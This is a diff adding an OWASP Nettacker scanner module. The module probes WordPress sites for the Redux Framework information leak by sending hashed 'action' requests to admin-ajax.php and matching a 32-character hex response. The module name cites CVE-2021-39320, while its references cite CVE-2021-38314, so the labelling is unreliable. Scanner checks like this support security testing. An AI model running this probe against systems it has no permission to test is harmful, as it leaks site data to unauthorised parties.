@@ -1,0 +1,57 @@
+info:
+  name: CVE_2021_39320_vuln
+  author: OWASP Nettacker Team
+  severity: 7
+  description: Sensitive Information Leakage - The Gutenberg Template Library & Redux Framework plugin <= 4.2.11 for WordPress
+  reference: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-38314
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve2021
+    - cve
+    - wordpress
+    - redux
+    - wp_plugin
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+          Accept: "*/*"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/wp-admin/admin-ajax.php?action=NETTACKER_MD5_GENERATOR_START{{md5}}NETTACKER_MD5_GENERATOR_STOP"
+            prefix: ""
+            suffix: ""
+            interceptors: generate_and_replace_md5
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              md5:
+                - 'http://{target}/-redux'
+                - 'https://{target}/-redux'
+        response:
+          condition_type: and
+          conditions:
+            status:
+              regex: 200
+              reverse: false
+            content:
+              regex: "[a-f0-9]{{32}}"
+              reverse: false
